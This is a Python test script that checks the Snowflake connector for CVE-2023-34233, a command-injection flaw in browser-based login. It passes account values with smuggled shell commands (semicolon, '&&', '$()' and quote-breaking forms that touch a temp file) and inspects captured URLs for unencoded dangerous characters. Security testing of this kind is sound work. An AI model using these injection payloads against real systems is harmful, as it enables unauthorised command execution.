#!/usr/bin/env python3
"""
Focused CVE-2023-34233 test - specifically targeting browser authentication flow
"""

import os
import time
import toml
import snowflake.connector
from unittest.mock import patch, MagicMock
import webbrowser
import sys

print("=" * 60)
print("FOCUSED CVE-2023-34233 TEST")
print("=" * 60)

def load_config():
    with open('config.toml', 'r') as f:
        config = toml.load(f)
    connection_name = list(config['connections'].keys())[0]
    return config['connections'][connection_name]

def test_browser_flow():
    """Test if we can capture the browser authentication URL"""
    
    creds = load_config()
    test_file = f"/tmp/browser_test_{int(time.time())}"
    
    print(f"Testing browser authentication flow...")
    print(f"Account: {creds['account']}")
    print(f"Test file: {test_file}")
    
    # Malicious payloads
    payloads = [
        f"{creds['account']}; touch {test_file}",
        f"{creds['account']} && touch {test_file}",
        f"{creds['account']}$(touch {test_file})",
        f"{creds['account']}'; touch {test_file}; echo 'test"
    ]
    
    browser_urls = []
    
    def capture_browser_call(*args, **kwargs):
        """Capture any browser calls"""
        url = args[0] if args else "NO_URL"
        browser_urls.append(url)
        print(f"\n🔍 BROWSER CALL CAPTURED:")
        print(f"URL: {url}")
        
        # Check for command injection signs
        dangerous_signs = [';', '&&', '$(', '`', '|']
        found_danger = [sign for sign in dangerous_signs if sign in url]
        
        if found_danger:
            print(f"⚠️  Dangerous characters found: {found_danger}")
            
            # Check if properly encoded
            encoded_signs = ['%3B', '%26', '%24', '%28', '%60', '%7C']
            found_encoded = [sign for sign in encoded_signs if sign in url]
            
            if found_encoded:
                print(f"✅ Found URL encoding: {found_encoded} - SECURE")
            else:
                print(f"🚨 NO URL encoding found - POTENTIALLY VULNERABLE")
        else:
            print(f"✅ No dangerous characters in URL")
        
        return MagicMock()  # Return a mock response
    
    # Test each payload
    for i, payload in enumerate(payloads, 1):
        print(f"\n[TEST {i}] Payload: {payload}")
        
        if os.path.exists(test_file):
            os.remove(test_file)
        
        with patch('webbrowser.open', side_effect=capture_browser_call) as mock_browser:
            try:
                conn = snowflake.connector.connect(
                    account=payload,
                    user=creds['user'],
                    password=creds.get('password', ''),
                    authenticator='externalbrowser',
                    login_timeout=10  # Short timeout
                )
                print("Connection succeeded unexpectedly!")
                conn.close()
                
            except Exception as e:
                print(f"Connection failed: {type(e).__name__}")
                error_msg = str(e)
                
                # Look for our payload in the error
                if payload.split(';')[0] != payload:  # Has semicolon
                    after_semicolon = payload.split(';', 1)[1].strip()
                    if after_semicolon in error_msg:
                        print(f"🚨 Command after semicolon found in error: {after_semicolon}")
                    else:
                        print(f"✅ Command after semicolon not in error message")
        
        # Check if command was executed
        time.sleep(1)
        if os.path.exists(test_file):
            print(f"🚨 COMMAND EXECUTED! File {test_file} was created")
            os.remove(test_file)
        else:
            print(f"✅ No command execution detected")
    
    print(f"\n" + "=" * 60)
    print("SUMMARY")
    print("=" * 60)
    print(f"Total browser calls captured: {len(browser_urls)}")
    
    if browser_urls:
        print(f"\nCaptured URLs:")
        for i, url in enumerate(browser_urls, 1):
            print(f"  {i}. {url}")
            
        # Analyze URLs for security
        vulnerable_urls = []
        for url in browser_urls:
            if any(char in url for char in [';', '&&', '$(']) and not any(enc in url for enc in ['%3B', '%26', '%24']):
                vulnerable_urls.append(url)
        
        if vulnerable_urls:
            print(f"\n🚨 POTENTIALLY VULNERABLE URLs found:")
            for url in vulnerable_urls:
                print(f"  - {url}")
        else:
            print(f"\n✅ All URLs appear properly encoded/secure")
    else:
        print(f"\n⚠️  No browser calls were captured")
        print(f"   This might indicate:")
        print(f"   - External browser auth is not being triggered")
        print(f"   - The vulnerability point is elsewhere")
        print(f"   - Connection fails before browser call")

if __name__ == "__main__":
    test_browser_flow()
